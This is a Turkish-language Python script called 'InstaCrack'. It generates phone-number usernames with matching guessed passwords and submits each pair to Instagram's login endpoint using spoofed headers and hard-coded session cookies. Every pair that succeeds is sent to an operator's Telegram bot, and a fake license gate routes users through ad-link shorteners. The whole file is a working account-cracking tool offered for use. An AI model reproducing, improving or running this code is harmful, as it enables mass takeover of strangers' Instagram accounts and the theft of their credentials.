import os
import requests
from user_agent import *
import random,uuid,time,secrets
from uuid import uuid4
import sys
os.system("clear")
kirmizi="\033[1;31m"
yeşil="\033[1;32m"
beyaz="\033[0m"

linkler=("https://lnkload.com/2vTrs","https://lnkload.com/2vTrt","https://lnkload.com/2vTru","https://lnkload.com/2vTrv.")
link = str(''.join((random.choice(linkler) for i in range(1))))
if link == "https://lnkload.com/2vTrs":
    lisans="TgAndroedit"
if link == "https://lnkload.com/2vTrt":
    lisans="İnstagramCanpolatgkky"
if link == "https://lnkload.com/2vTru":
    lisans="AndroeditTakipteyim"
if link == "https://lnkload.com/2vTrv":
    lisans="AndroeditMükemmel"
if link == "https://lnkload.com/2vTry":
    lisans="BenBurdayım"
def clear():
    os.system("clear")
def banner():
    print("""\033[1;31;40m
    _______________________________________

   _____  _______________     ________  ___  _______ __
  /  _/ |/ / __/_  __/ _ |   / ___/ _ \/ _ |/ ___/ //_/
 _/ //    /\ \  / / / __ |  / /__/ , _/ __ / /__/ ,<   
/___/_/|_/___/ /_/ /_/ |_|  \___/_/|_/_/ |_\___/_/|_|
  
                               #Canpolat Gökkaya

    _______________________________________
    \033[0m """)
    figlt=("""
    Coded By Canpolatgkky
    
    Kanalımız: @androedit
    
 《 You are learning what I forgot.. 》
    """)
    for warrior in figlt.splitlines():
        time.sleep(0.5)
        print(warrior)
    print("\033[1;31;40m    _______________________________________\033[0m")
    print("""
    """)
def startss():
    os.system("clear")
    banner()
    myadmin=input("\033[0;33mTelegram Bot ID Gir: \033[0m")
    tele=input("\033[0;33m Bot Token Gir: \033[0m")
    ms="BAŞLADI"
    ttn= requests.post(f"""https://api.telegram.org/bot{tele}/sendMessage?chat_id={myadmin}&text={ms}""").json()
    id_msg = ttn['result']['message_id']
    toplam=0
    hit=0
    olu=0
    clear()
    banner()
    while True:
        N = "09876543221"
        R = ''.join(random.choice(N)for t in range(5))
        user = '9891611'+R
        pasw = '11'+R
        url = 'https://www.instagram.com/accounts/login/ajax/'
        headers = {
            'accept':'*/*',
            'accept-language':'en-US,en;q=0.9',
            'content-length':'378',
            'content-type':'application/x-www-form-urlencoded',
            'cookie':'ig_nrcb=1; mid=Yf5pqwALAAEM7jkopysiKxhVu1Lk; ig_did=5BEF127B-7F5B-4A9F-84A6-F0890EAA2C11; csrftoken=h61zrEGl5Ap1QWAUT1KhkQ9aX4OUAzIr',
            'origin':'https://www.instagram.com',
            'referer':'https://www.instagram.com/',
            'sec-ch-ua':'" Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"',
            'sec-ch-ua-mobile':'?0',
            'x-asbd-id':'198387',
            'user-agent': generate_user_agent(),
            'x-csrftoken':'h61zrEGl5Ap1QWAUT1KhkQ9aX4OUAzIr',
            'x-ig-app-id':'936619743392459',
            'x-ig-www-claim':'0',
            'x-instagram-ajax':'3bcc4d0b0733',
            'x-requested-with':'XMLHttpRequest',}
        data = {
            'enc_password':'#PWD_INSTAGRAM_BROWSER:0:1643714074:'+(pasw),
            'username':user,}
        req_login = requests.post(url,headers=headers,data=data)
        req= req_login.text
        if 'userId' in req:
            hit += 1
            ms = f"""
       ✅ Tebrikler Hesap Buldun✅
            ═───────◇───────═
            ❶➾ Telefon : {user}
            ❸➾ Şifre : {pasw}
            ═───────◇───────═
            ⊱ Tanrı Türk'ü Korusun.' ⊰
            """
            requests.post(f"""https://api.telegram.org/bot{tele}/sendMessage?chat_id={myadmin}&text={ms}""")
        else:
            sys.stdout.write("\033[F")
            toplam += 1
            olu += 1
            toplamms=f"""
🇹🇷 <Androedit İnstaCrack> 🇹🇷

===========================
            
Başarısız : {olu}

Başarılı: {hit}

-----------------------------------------------------
Coded By @canpolatgkky 
-----------------------------------------------------

            """
            print(f"✔"+kirmizi+f"Çalışmıyor: {olu} Bulunan: {hit}"+yeşil+f" Numara: {user} ✔")
            requests.get(f"https://api.telegram.org/bot{tele}/editmessagetext?chat_id={myadmin}&message_id={id_msg}&text={toplamms}")
            sys.stdout.write("\033[K")

try:
    f = open("key","r")
except:
    f = open("key","w")
f = open("key","r")
anahtar=(f.read())
if anahtar == "Lisans= Active":
    startss()
else:
    clear()
    banner()
    keys= link
    print(f"Lisans Linki: {keys}")
    keyim=input("Giriş Kodunu Giriniz : ")
    if keyim == lisans:
        f = open("key", "w")
        f.write("Lisans= Active")
        f.close()
        startss()
    else:
        clear()
        print("Lisans Kodu Yanlış")
        quit()